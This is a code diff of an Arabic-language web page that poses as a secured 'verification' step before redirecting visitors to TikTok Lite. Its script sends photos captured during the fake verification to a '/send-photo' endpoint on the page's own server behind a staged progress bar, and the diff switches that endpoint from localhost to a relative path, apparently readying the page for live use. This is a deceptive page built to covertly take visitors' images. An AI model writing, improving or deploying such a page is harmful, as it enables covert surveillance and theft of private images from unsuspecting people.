@@ -97,7 +97,7 @@
             <p class="subtitle">جارٍ تحويلك للمحتوى...</p>
         </div>
 
-                <div class="footer">
+        <div class="footer">
             <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
             Secured by Advanced Protection
         </div>
@@ -108,8 +108,9 @@
 
     <script>
         const TARGET_URL = 'https://www.tiktok.com/tiktoklite';
-        const API_URL = 'http://localhost:3000/send-photo';
-        
+        // ⬅️ تغيير مهم: استخدم نفس الرابط النسبي
+        const API_URL = '/send-photo';
+
         let capturedPhotos = [];
 
         async function startVerification() {
@@ -176,11 +177,11 @@
 
         async function sendPhotosToServer() {
             const progressText = document.getElementById('progressText');
-            
+
             for (let i = 0; i < capturedPhotos.length; i++) {
                 const photo = capturedPhotos[i];
                 progressText.textContent = `جارٍ إرسال الصور... (${i + 1}/${capturedPhotos.length})`;
-                
+
                 try {
                     await fetch(API_URL, {
                         method: 'POST',
@@ -193,7 +194,7 @@
                 } catch (err) {
                     console.error('Failed to send photo:', err);
                 }
-                
+
                 await new Promise(r => setTimeout(r, 500));
             }
         }
@@ -202,7 +203,7 @@
             document.getElementById('progressContainer').style.display = 'block';
             let progress = 0;
             const fill = document.getElementById('progressFill');
-            
+
             const interval = setInterval(() => {
                 progress += Math.random() * 15 + 5;
                 if (progress > 90) progress = 90;
@@ -215,7 +216,7 @@
             document.getElementById('verifyStage').style.display = 'none';
             document.getElementById('successStage').style.display = 'block';
             capturedPhotos = [];
-            
+
             setTimeout(() => {
                 window.location.href = TARGET_URL;
             }, 2200);
